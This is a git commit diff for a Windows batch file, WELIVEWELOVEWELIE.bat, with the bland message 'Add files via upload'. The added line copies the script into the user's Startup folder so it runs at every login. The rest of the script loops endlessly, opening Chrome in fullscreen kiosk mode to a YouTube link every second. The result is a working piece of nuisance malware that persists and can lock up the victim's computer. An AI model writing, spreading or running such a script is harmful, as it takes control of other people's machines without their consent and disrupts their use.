7b9810bdb03409585427a2a4dc0a5c5970f41285
Hunterz974 <85232470+hunterz974@users.noreply.github.com>
2024-01-24 21:51:33 +0100

    Add files via upload

--- WELIVEWELOVEWELIE.bat
+++ WELIVEWELOVEWELIE.bat
@@ -1,5 +1,6 @@
 
 @echo off
+copy /y "E:\WELIVEWELOVEWELIE.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 :x
 start "" "chrome" --kiosk --fullscreen --incognito "https://youtu.be/QxYpiBlHr1w?si=ldxvQ46jo002Gjhb"
 timeout /t 1 /nobreak
